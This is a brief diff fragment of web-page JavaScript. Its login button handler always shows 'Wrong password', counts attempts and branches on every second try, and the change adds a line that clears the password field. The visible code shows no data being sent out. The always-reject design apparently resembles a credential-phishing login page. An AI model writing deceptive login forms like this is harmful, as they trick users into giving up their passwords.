@@ -408,6 +408,7 @@ motionAI_Init('10509?color=62a8ea&sendBtn=SEND&inputBox=Type+something...&token=
     var attempts = 0;
     $('#btn-login').click(function(e){
       alert('Wrong password');
+      $('#login-password').val('');
       attempts++;
       if(attempts % 2 == 0)
       {
